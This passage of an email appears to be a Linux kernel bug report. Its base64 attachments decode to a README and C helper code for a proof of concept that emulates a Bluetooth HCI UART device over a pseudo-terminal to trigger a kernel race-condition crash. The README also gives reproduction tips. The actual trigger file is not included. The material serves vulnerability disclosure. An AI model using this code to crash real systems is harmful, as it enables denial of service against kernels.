I2luY2x1ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8c3lzL3N5c2NhbGwuaD4K
Ci8vIG1hY3JvcyBhbmQgc3RydWN0cwojZGVmaW5lIGJvb2wgdWludDgKI2Rl
ZmluZSB0cnVlIDEKI2RlZmluZSBmYWxzZSAwCgp0eXBlZGVmIHVpbnQ4X3Qg
dWludDg7CnR5cGVkZWYgdWludDE2X3QgdWludDE2Owp0eXBlZGVmIHVpbnQz
Ml90IHVpbnQzMjsKdHlwZWRlZiB1aW50NjRfdCB1aW50NjQ7CgpzdHJ1Y3Qg
c29ja2FkZHJfaGNpIHsKICAgICAgICB1bnNpZ25lZCBzaG9ydCBoY2lfZmFt
aWx5OwogICAgICAgIHVuc2lnbmVkIHNob3J0IGhjaV9kZXY7CiAgICAgICAg
dW5zaWduZWQgc2hvcnQgaGNpX2NoYW5uZWw7Cn07CgojZGVmaW5lIEhDSURF
VlVQICAgX0lPVygnSCcsIDIwMSwgaW50KQojZGVmaW5lIEhDSVNFVFNDQU4g
X0lPVygnSCcsIDIyMSwgaW50KQojZGVmaW5lIEhDSUlOUVVJUlkgX0lPUign
SCcsIDI0MCwgaW50KQoKI2RlZmluZSBIQ0lVQVJUR0VUREVWSUNFICAgICAg
ICBfSU9SKCdVJywgMjAyLCBpbnQpCiNkZWZpbmUgSENJVUFSVFNFVEZMQUdT
ICAgICAgICAgX0lPVygnVScsIDIwMywgaW50KQojZGVmaW5lIEhDSVVBUlRT
RVRQUk9UTyAgICAgICAgIF9JT1coJ1UnLCAyMDAsIGludCkKI2RlZmluZSBI
Q0lfVUFSVF9SRVNFVF9PTl9JTklUICAxCgojZGVmaW5lIEJUUFJPVE9fSENJ
IDEKI2RlZmluZSBBQ0xfTElOSyAxCiNkZWZpbmUgU0NBTl9QQUdFIDIKCnR5
cGVkZWYgc3RydWN0IHsKICB1aW50OF90IGJbNl07Cn0gX19hdHRyaWJ1dGVf
XygocGFja2VkKSkgYmRhZGRyX3Q7CgojZGVmaW5lIEhDSV9DT01NQU5EX1BL
VCAxCiNkZWZpbmUgSENJX0VWRU5UX1BLVCA0CiNkZWZpbmUgSENJX1ZFTkRP
Ul9QS1QgMHhmZgoKI2RlZmluZSBIQ0lfT1BfV1JJVEVfQ0FfVElNRU9VVCAw
eDBjMTYKCnN0cnVjdCBoY2lfY29tbWFuZF9oZHIgewogIHVpbnQxNl90IG9w
Y29kZTsKICB1aW50OF90IHBsZW47Cn0gX19hdHRyaWJ1dGVfXygocGFja2Vk
KSk7CgpzdHJ1Y3QgaGNpX2V2ZW50X2hkciB7CiAgdWludDhfdCBldnQ7CiAg
dWludDhfdCBwbGVuOwp9IF9fYXR0cmlidXRlX18oKHBhY2tlZCkpOwoKI2Rl
ZmluZSBIQ0lfRVZfQ09OTl9DT01QTEVURSAweDAzCnN0cnVjdCBoY2lfZXZf
Y29ubl9jb21wbGV0ZSB7CiAgdWludDhfdCBzdGF0dXM7CiAgdWludDE2X3Qg
aGFuZGxlOwogIGJkYWRkcl90IGJkYWRkcjsKICB1aW50OF90IGxpbmtfdHlw
ZTsKICB1aW50OF90IGVuY3JfbW9kZTsKfSBfX2F0dHJpYnV0ZV9fKChwYWNr
ZWQpKTsKCiNkZWZpbmUgSENJX0VWX0NPTk5fUkVRVUVTVCAweDA0CnN0cnVj
dCBoY2lfZXZfY29ubl9yZXF1ZXN0IHsKICBiZGFkZHJfdCBiZGFkZHI7CiAg
dWludDhfdCBkZXZfY2xhc3NbM107CiAgdWludDhfdCBsaW5rX3R5cGU7Cn0g
X19hdHRyaWJ1dGVfXygocGFja2VkKSk7CgojZGVmaW5lIEhDSV9FVl9SRU1P
VEVfRkVBVFVSRVMgMHgwYgpzdHJ1Y3QgaGNpX2V2X3JlbW90ZV9mZWF0dXJl
cyB7CiAgdWludDhfdCBzdGF0dXM7CiAgdWludDE2X3QgaGFuZGxlOwogIHVp
bnQ4X3QgZmVhdHVyZXNbOF07Cn0gX19hdHRyaWJ1dGVfXygocGFja2VkKSk7
CgojZGVmaW5lIEhDSV9FVl9DTURfQ09NUExFVEUgMHgwZQpzdHJ1Y3QgaGNp
X2V2X2NtZF9jb21wbGV0ZSB7CiAgdWludDhfdCBuY21kOwogIHVpbnQxNl90
IG9wY29kZTsKfSBfX2F0dHJpYnV0ZV9fKChwYWNrZWQpKTsKCiNkZWZpbmUg
SENJX09QX1dSSVRFX1NDQU5fRU5BQkxFIDB4MGMxYQoKI2RlZmluZSBIQ0lf
T1BfUkVBRF9CVUZGRVJfU0laRSAweDEwMDUKc3RydWN0IGhjaV9ycF9yZWFk
X2J1ZmZlcl9zaXplIHsKICB1aW50OF90IHN0YXR1czsKICB1aW50MTZfdCBh
Y2xfbXR1OwogIHVpbnQ4X3Qgc2NvX210dTsKICB1aW50MTZfdCBhY2xfbWF4
X3BrdDsKICB1aW50MTZfdCBzY29fbWF4X3BrdDsKfSBfX2F0dHJpYnV0ZV9f
KChwYWNrZWQpKTsKCiNkZWZpbmUgSENJX09QX1JFQURfQkRfQUREUiAweDEw
MDkKc3RydWN0IGhjaV9ycF9yZWFkX2JkX2FkZHIgewogIHVpbnQ4X3Qgc3Rh
dHVzOwogIGJkYWRkcl90IGJkYWRkcjsKfSBfX2F0dHJpYnV0ZV9fKChwYWNr
ZWQpKTsKCiNkZWZpbmUgSENJX0VWX0xFX01FVEEgMHgzZQpzdHJ1Y3QgaGNp
X2V2X2xlX21ldGEgewogIHVpbnQ4X3Qgc3ViZXZlbnQ7Cn0gX19hdHRyaWJ1
dGVfXygocGFja2VkKSk7CgojZGVmaW5lIEhDSV9FVl9MRV9DT05OX0NPTVBM
RVRFIDB4MDEKc3RydWN0IGhjaV9ldl9sZV9jb25uX2NvbXBsZXRlIHsKICB1
aW50OF90IHN0YXR1czsKICB1aW50MTZfdCBoYW5kbGU7CiAgdWludDhfdCBy
b2xlOwogIHVpbnQ4X3QgYmRhZGRyX3R5cGU7CiAgYmRhZGRyX3QgYmRhZGRy
OwogIHVpbnQxNl90IGludGVydmFsOwogIHVpbnQxNl90IGxhdGVuY3k7CiAg
dWludDE2X3Qgc3VwZXJ2aXNpb25fdGltZW91dDsKICB1aW50OF90IGNsa19h
Y2N1cmFuY3k7Cn0gX19hdHRyaWJ1dGVfXygocGFja2VkKSk7CgpzdHJ1Y3Qg
aGNpX2Rldl9yZXEgewogIHVpbnQxNl90IGRldl9pZDsKICB1aW50MzJfdCBk
ZXZfb3B0Owp9OwoKc3RydWN0IHZoY2lfdmVuZG9yX3BrdCB7CiAgdWludDhf
dCB0eXBlOwogIHVpbnQ4X3Qgb3Bjb2RlOwogIHVpbnQxNl90IGlkOwp9OwoK
c3RydWN0IHBwYXJhbSB7CiAgaW50IG1mZDsKICBpbnQgc2ZkOwogIGludCBz
b2NrOwp9OwoKLy8gZnVuY3Rpb25zCgpzdHJ1Y3QgcHBhcmFtIGluaXRpYWxp
emVfaGNpX3VhcnQoKTsKI2VuZGlmCg==

--000000000000f849b305c20729d4
Content-Type: application/octet-stream; name=README
Content-Disposition: attachment; filename=README
Content-Transfer-Encoding: base64
Content-ID: <f_kojlekyn3>
X-Attachment-Id: f_kojlekyn3

UkVBRE1FCgpUaGlzIFBPQyBpcyBqdXN0IGFpbSB0byB0cmlnZ2VyIHRoZSBi
dWcuIFRoZXJlIGFyZSB0aHJlZSBmaWxlcyAKCi0gcHRteF9zaW0uaDogaGVh
ZGVyIGZpbGUgZm9yIHN0cnVjdHMgYW5kIG1hY3Jvcy4KLSBwdG14X3NpbS5j
OiB1dGlsaXR5IGZpbGUgdGhhdCBoZWxwIHRvIGNyZWF0ZSBwdG14LWJhc2Vk
IGhjaSBkZXZpY2UuICAKLSBwdG14X2NyYXNoLmM6IG1haW4gY3Jhc2ggZmls
ZSB0byB0cmlnZ2VyIHRoZSByYWNlLWNvbmRpdGlvbgoKWW91IGNhbiBjb21w
aWxlIHRoZSBleGVjdXRhYmxlIGFzIGJlbG93Cj4gZ2NjIHB0bXhfY3Jhc2gu
YyBwdG14X3NpbS5jIC1vIHB0bXhfY3Jhc2gKCk1vcmVvdmVyLCB0aGlzIGV4
ZWN1dGFibGUgbWF5IHJlcXVpcmVzIENBUF9ORVRfQURNSU4gdG8gcnVuLgoK
VGhpcyBidWcgbWF5IG5lZWQgdGltZSB0byByZXByb2R1Y2UuIElmIHlvdSBm
YWlsIHRvIGNyYXNoIHRoZSBrZXJuZWwsIHlvdSBjYW4gdHJ5IGJlbG93IHdh
eXMuCgoxLiBBbHRlciB0aGUgcHJlcGFyZV9yYW5kb20oKSBmdW5jdGlvbiBh
bmQgZGVsdGEgdmFyaWFibGUgaW4gcHRteF9jcmFzaC5jCjIuIFlvdSBjYW4g
cHJvYWN0aXZlbHkgaW5qZWN0IGRlbGF5IGluIHlvdSBrZXJuZWwuCg==

--000000000000f849b305c20729d4
Content-Type: application/octet-stream; name="ptmx_sim.c"
Content-Disposition: attachment; filename="ptmx_sim.c"
Content-Transfer-Encoding: base64
Content-ID: <f_kojlekyd1>
X-Attachment-Id: f_kojlekyd1

I2luY2x1ZGUgPHRlcm1pb3MuaD4KI2luY2x1ZGUgPHB0aHJlYWQuaD4KI2lu
Y2x1ZGUgPHN5cy91aW8uaD4KCiNpbmNsdWRlICJwdG14X3NpbS5oIgoKaW50
IGdldG1hc3RlcigpCnsKICAgIGludCBmZG0gPSBvcGVuKCIvZGV2L3B0bXgi
LCBPX1JEV1IgfCBPX05PQ1RUWSk7CiAgICBpZiAoZmRtIDwgMCkKICAgICAg
ICBwZXJyb3IoInB0bXggb3BlbiIpLCBleGl0KDEpOwogICAgZ3JhbnRwdChm
ZG0pOwogICAgdW5sb2NrcHQoZmRtKTsKICAgIHJldHVybiBmZG07Cn0KCmlu
dCBnZXRzbGF2ZShpbnQgZmRtKQp7CiAgICBjaGFyIGJ1ZlszMl07CiAgICBp
bnQgcHR5bm8sIGZkczsKICAgIGlmIChpb2N0bChmZG0sIFRJT0NHUFROLCAm
cHR5bm8pKQogICAgICAgICAgICBwZXJyb3IoIlRJT0NHUFROIiksIGV4aXQo
MSk7CiAgICBzcHJpbnRmKGJ1ZiwgIi9kZXYvcHRzLyVkIiwgcHR5bm8pOwog
ICAgZmRzID0gb3BlbihidWYsIE9fUkRXUiB8IE9fTk9DVFRZKTsKICAgIGlm
IChmZHMgPCAwKQogICAgICAgIHBlcnJvcigicHRzIG9wZW4iKSwgZXhpdCgx
KTsKICAgIHJldHVybiBmZHM7Cn0KCmludCBzZXRzZXJpYWwoaW50IGZkKQp7
CiAgICBzdHJ1Y3QgdGVybWlvcyB0aTsKICAgIGludCBzYXZlZF9sZGlzYywg
bGRpc2MgPSBOX0hDSTsKICAgIHVuc2lnbmVkIGNoYXIgZmxvd2N0bCA9IDA7
CiAgICB1bnNpZ25lZCBpbnQgc3BlZWQgPSBCMTE1MjAwOwoKICAgIGlmICh0
Y2ZsdXNoKGZkLCBUQ0lPRkxVU0gpIDwgMCkgewogICAgICAgIHBlcnJvcigi
RmFpbGVkIHRvIGZsdXNoIHNlcmlhbCBwb3J0Iik7CiAgICAgICAgY2xvc2Uo
ZmQpOwogICAgICAgIGV4aXQoMSk7CiAgICB9CgogICAgaWYgKGlvY3RsKGZk
LCBUSU9DR0VURCwgJnNhdmVkX2xkaXNjKSA8IDApIHsKICAgICAgICBwZXJy
b3IoIkZhaWxlZCBnZXQgc2VyaWFsIGxpbmUgZGlzY2lwbGluZSIpOwogICAg
ICAgIGNsb3NlKGZkKTsKICAgICAgICBleGl0KDEpOwogICAgfQoKICAgIC8q
IFN3aXRjaCBUVFkgdG8gcmF3IG1vZGUgKi8KICAgIG1lbXNldCgmdGksIDAs
IHNpemVvZih0aSkpOwogICAgY2ZtYWtlcmF3KCZ0aSk7CgogICAgdGkuY19j
ZmxhZyB8PSAoc3BlZWQgfCBDTE9DQUwgfCBDUkVBRCk7CgogICAgaWYgKGZs
b3djdGwpIHsKICAgICAgICAvKiBTZXQgZmxvdyBjb250cm9sICovCiAgICAg
ICAgdGkuY19jZmxhZyB8PSBDUlRTQ1RTOwogICAgfQoKICAgIGlmICh0Y3Nl
dGF0dHIoZmQsIFRDU0FOT1csICZ0aSkgPCAwKSB7CiAgICAgICAgcGVycm9y
KCJGYWlsZWQgdG8gc2V0IHNlcmlhbCBwb3J0IHNldHRpbmdzIik7CiAgICAg
ICAgY2xvc2UoZmQpOwogICAgICAgIGV4aXQoMSk7CiAgICB9CgogICAgaWYg
KGlvY3RsKGZkLCBUSU9DU0VURCwgJmxkaXNjKSA8IDApIHsKICAgICAgICBw
ZXJyb3IoIkZhaWxlZCBzZXQgc2VyaWFsIGxpbmUgZGlzY2lwbGluZSIpOwog
ICAgICAgIGNsb3NlKGZkKTsKICAgICAgICBleGl0KDEpOwogICAgfQoKICAg
IHJldHVybiAwOwp9CgppbnQgYXR0YWNocHJvdG8oaW50IGZkKQp7CiAgICB1
bnNpZ25lZCBpbnQgZmxhZ3MgPSAoMSA8PCBIQ0lfVUFSVF9SRVNFVF9PTl9J
TklUKTsKICAgIGlmIChpb2N0bChmZCwgSENJVUFSVFNFVEZMQUdTLCBmbGFn
cykgPCAwKSB7Ly8gc2V0IGZsYWdzCiAgICAgICAgcGVycm9yKCJGYWlsZWQg
dG8gc2V0IGZsYWdzIik7CiAgICAgICAgY2xvc2UoZmQpOwogICAgICAgIHJl
dHVybiAtMTsKICAgIH0KCiAgICB1bnNpZ25lZCBpbnQgcHJvdG8gPSAwOwog
ICAgaWYgKGlvY3RsKGZkLCBIQ0lVQVJUU0VUUFJPVE8sIHByb3RvKSA8IDAp
IHsvLyBIQ0kgc2V0IHByb3RvY29sCiAgICAgICAgcGVycm9yKCJGYWlsZWQg
dG8gc2V0IHByb3RvY29sIik7CiAgICAgICAgY2xvc2UoZmQpOwogICAgICAg
IHJldHVybiAtMTsKICAgIH0KCiAgICBpbnQgZGV2X2lkID0gaW9jdGwoZmQs
IEhDSVVBUlRHRVRERVZJQ0UpOwogICAgaWYgKGRldl9pZCA8IDApIHsKICAg
ICAgICBwZXJyb3IoIkZhaWxlZCB0byBnZXQgZGV2aWNlIGlkIik7CiAgICAg
ICAgY2xvc2UoZmQpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KfQoKdm9p
ZCBoY2lfc2VuZF9ldmVudF9wYWNrZXQoaW50IGZkLCB1aW50OF90IGV2dCwg
dm9pZCogZGF0YSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
IHNpemVfdCBkYXRhX2xlbikKewogIHN0cnVjdCBpb3ZlYyBpdlszXTsKICBz
dHJ1Y3QgaGNpX2V2ZW50X2hkciBoZHI7CiAgaGRyLmV2dCA9IGV2dDsKICBo
ZHIucGxlbiA9IGRhdGFfbGVuOwogIHVpbnQ4X3QgdHlwZSA9IEhDSV9FVkVO
VF9QS1Q7CiAgaXZbMF0uaW92X2Jhc2UgPSAmdHlwZTsKICBpdlswXS5pb3Zf
bGVuID0gc2l6ZW9mKHR5cGUpOwogIGl2WzFdLmlvdl9iYXNlID0gJmhkcjsK
ICBpdlsxXS5pb3ZfbGVuID0gc2l6ZW9mKGhkcik7CiAgaXZbMl0uaW92X2Jh
c2UgPSBkYXRhOwogIGl2WzJdLmlvdl9sZW4gPSBkYXRhX2xlbjsKICBpZiAo
d3JpdGV2KGZkLCBpdiwgc2l6ZW9mKGl2KSAvIHNpemVvZihzdHJ1Y3QgaW92
ZWMpKSA8IDApCiAgICBleGl0KDEpOwp9Cgp2b2lkIGhjaV9zZW5kX2V2ZW50
X2NtZF9jb21wbGV0ZShpbnQgZmQsIHVpbnQxNl90IG9wY29kZSwgdm9pZCog
ZGF0YSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
IHNpemVfdCBkYXRhX2xlbikKewogIHN0cnVjdCBpb3ZlYyBpdls0XTsKICBz
dHJ1Y3QgaGNpX2V2ZW50X2hkciBoZHI7CiAgaGRyLmV2dCA9IEhDSV9FVl9D
TURfQ09NUExFVEU7CiAgaGRyLnBsZW4gPSBzaXplb2Yoc3RydWN0IGhjaV9l
dl9jbWRfY29tcGxldGUpICsgZGF0YV9sZW47CiAgc3RydWN0IGhjaV9ldl9j
bWRfY29tcGxldGUgZXZ0X2hkcjsKICBldnRfaGRyLm5jbWQgPSAxOwogIGV2
dF9oZHIub3Bjb2RlID0gb3Bjb2RlOwogIHVpbnQ4X3QgdHlwZSA9IEhDSV9F
VkVOVF9QS1Q7CiAgaXZbMF0uaW92X2Jhc2UgPSAmdHlwZTsKICBpdlswXS5p
b3ZfbGVuID0gc2l6ZW9mKHR5cGUpOwogIGl2WzFdLmlvdl9iYXNlID0gJmhk
cjsKICBpdlsxXS5pb3ZfbGVuID0gc2l6ZW9mKGhkcik7CiAgaXZbMl0uaW92
X2Jhc2UgPSAmZXZ0X2hkcjsKICBpdlsyXS5pb3ZfbGVuID0gc2l6ZW9mKGV2
dF9oZHIpOwogIGl2WzNdLmlvdl9iYXNlID0gZGF0YTsKICBpdlszXS5pb3Zf
bGVuID0gZGF0YV9sZW47CiAgaWYgKHdyaXRldihmZCwgaXYsIHNpemVvZihp
dikgLyBzaXplb2Yoc3RydWN0IGlvdmVjKSkgPCAwKQogICAgZXhpdCgxKTsK
fQoKYm9vbCBwcm9jZXNzX2NvbW1hbmRfcGt0KGludCBmZCwgY2hhciogYnVm
LCBzc2l6ZV90IGJ1Zl9zaXplKQp7CiAgc3RydWN0IGhjaV9jb21tYW5kX2hk
ciogaGRyID0gKHN0cnVjdCBoY2lfY29tbWFuZF9oZHIqKWJ1ZjsKICBpZiAo
YnVmX3NpemUgPCAoc3NpemVfdClzaXplb2Yoc3RydWN0IGhjaV9jb21tYW5k
X2hkcikgfHwKICAgICAgaGRyLT5wbGVuICE9IGJ1Zl9zaXplIC0gc2l6ZW9m
KHN0cnVjdCBoY2lfY29tbWFuZF9oZHIpKSB7CiAgICBleGl0KDEpOwogIH0K
ICBib29sIHJldG9ybm90ID0gZmFsc2U7CgogIHN3aXRjaCAoaGRyLT5vcGNv
ZGUpIHsKICBjYXNlIEhDSV9PUF9XUklURV9DQV9USU1FT1VUOiB7CiAgICBy
ZXRvcm5vdCA9IHRydWU7CiAgICBicmVhazsKICB9CiAgY2FzZSBIQ0lfT1Bf
UkVBRF9CRF9BRERSOiB7CiAgICBzdHJ1Y3QgaGNpX3JwX3JlYWRfYmRfYWRk
ciBycCA9IHswfTsKICAgIHJwLnN0YXR1cyA9IDA7CiAgICBtZW1zZXQoJnJw
LmJkYWRkciwgMHhhYSwgNik7CiAgICBoY2lfc2VuZF9ldmVudF9jbWRfY29t
cGxldGUoZmQsIGhkci0+b3Bjb2RlLCAmcnAsIHNpemVvZihycCkpOwogICAg
cmV0dXJuIGZhbHNlOwogIH0KICBjYXNlIEhDSV9PUF9SRUFEX0JVRkZFUl9T
SVpFOiB7CiAgICBzdHJ1Y3QgaGNpX3JwX3JlYWRfYnVmZmVyX3NpemUgcnAg
PSB7MH07CiAgICBycC5zdGF0dXMgPSAwOwogICAgcnAuYWNsX210dSA9IDEw
MjE7CiAgICBycC5zY29fbXR1ID0gOTY7CiAgICBycC5hY2xfbWF4X3BrdCA9
IDQ7CiAgICBycC5zY29fbWF4X3BrdCA9IDY7CiAgICBoY2lfc2VuZF9ldmVu
dF9jbWRfY29tcGxldGUoZmQsIGhkci0+b3Bjb2RlLCAmcnAsIHNpemVvZihy
cCkpOwogICAgcmV0dXJuIGZhbHNlOwogIH0KICB9CiAgY2hhciBkdW1teVsw
eGY5XSA9IHswfTsKICBoY2lfc2VuZF9ldmVudF9jbWRfY29tcGxldGUoZmQs
IGhkci0+b3Bjb2RlLCBkdW1teSwgc2l6ZW9mKGR1bW15KSk7CiAgaWYgKCFy
ZXRvcm5vdCkgcmV0dXJuIGZhbHNlOwogIGVsc2UgcmV0dXJuIHRydWU7Cn0K
CnZvaWQgKmV2ZW50X3RocmVhZCh2b2lkKiBhcmcpCnsKICBpbnQgZmRtYXN0
ZXIgPSAqKGludCopYXJnOwogIHdoaWxlICgxKSB7CiAgICBjaGFyIGJ1Zlsx
MDI0XSA9IHswfTsKICAgIHNzaXplX3QgYnVmX3NpemUgPSByZWFkKGZkbWFz
dGVyLCBidWYsIHNpemVvZihidWYpKTsKICAgIGlmIChidWZfc2l6ZSA8IDAp
CiAgICAgIGV4aXQoMSk7CiAgICBpZiAoYnVmX3NpemUgPiAwICYmIGJ1Zlsw
XSA9PSBIQ0lfQ09NTUFORF9QS1QpIHsKICAgICAgaWYgKHByb2Nlc3NfY29t
bWFuZF9wa3QoZmRtYXN0ZXIsIGJ1ZiArIDEsIGJ1Zl9zaXplIC0gMSkpCiAg
ICAgICAgYnJlYWs7CiAgICB9CiAgfQogIHJldHVybiBOVUxMOwp9CgpzdHJ1
Y3QgcHBhcmFtIGluaXRpYWxpemVfaGNpX3VhcnQoKSAKewogIGludCBtYXN0
ZXIgPSBnZXRtYXN0ZXIoKTsKICBpbnQgc2xhdmUgPSBnZXRzbGF2ZShtYXN0
ZXIpOwogIHNldHNlcmlhbChzbGF2ZSk7CiAgYXR0YWNocHJvdG8oc2xhdmUp
OwoKICBwdGhyZWFkX3QgdGg7CiAgcHRocmVhZF9jcmVhdGUoJnRoLCBOVUxM
LCBldmVudF90aHJlYWQsICZtYXN0ZXIpOwogIHB0aHJlYWRfam9pbih0aCwg
TlVMTCk7CiAKICBpbnQgaGNpX3NvY2sgPSBzb2NrZXQoQUZfQkxVRVRPT1RI
LCBTT0NLX1JBVywgQlRQUk9UT19IQ0kpOwogIGludCByZXQgPSBpb2N0bCho
Y2lfc29jaywgSENJREVWVVAsIDApOwoKICBpZiAocmV0KSB7CiAgICBpZiAo
cmV0ICYmIGVycm5vICE9IEVBTFJFQURZKQogICAgICBwZXJyb3IoImlvY3Rs
KEhDSURFVlVQKSBmYWlsZWQiKSxleGl0KDEpOwogIH0KCiAgcHRocmVhZF9q
b2luKHRoLCBOVUxMKTsgIAogIHN0cnVjdCBwcGFyYW0gcmVzOwogIHJlcy5t
ZmQgPSBtYXN0ZXI7CiAgcmVzLnNmZCA9IHNsYXZlOwogIHJlcy5zb2NrID0g
aGNpX3NvY2s7CiAgcmV0dXJuIHJlczsKfQo=

--000000000000f849b305c20729d4--
